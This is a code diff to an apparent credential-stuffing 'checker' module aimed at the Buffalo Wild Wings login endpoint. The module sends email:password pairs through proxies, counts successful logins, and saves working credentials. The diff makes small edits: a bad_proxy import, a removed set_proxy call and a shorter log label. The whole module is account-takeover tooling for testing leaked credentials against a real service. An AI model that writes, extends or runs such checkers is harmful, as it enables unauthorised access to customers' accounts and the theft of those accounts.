@@ -1,11 +1,10 @@
 from __main__ import checker
 from requests import post
-from modules.functions import log,save,set_proxy
+from modules.functions import log,save,set_proxy,bad_proxy
 
 def check(email:str,password:str):
     retries = 0
     while retries != checker.retries:
-        proxy = set_proxy()
         headers = {
             "Origin": "https://www.buffalowildwings.com" ,
             "Referer": "https://www.buffalowildwings.com/en/account/log-in/" ,
@@ -21,7 +20,7 @@ def check(email:str,password:str):
                 retries += 1
             elif r.status_code == 200:
                 if not checker.cui:
-                    log("good",email+":"+password,"Buffalo Wild Wings")
+                    log("good",email+":"+password,"BWW")
                 save("Buffalo Wild Wings","good",checker.time,email+":"+password)
                 checker.good += 1
                 checker.cpm += 1
@@ -31,7 +30,7 @@ def check(email:str,password:str):
         except:
             checker.retries += 1
     if not checker.cui:
-        log("bad",email+":"+password,"Buffalo Wild Wings")
+        log("bad",email+":"+password,"BWW")
     checker.bad += 1
     checker.cpm += 1
     return
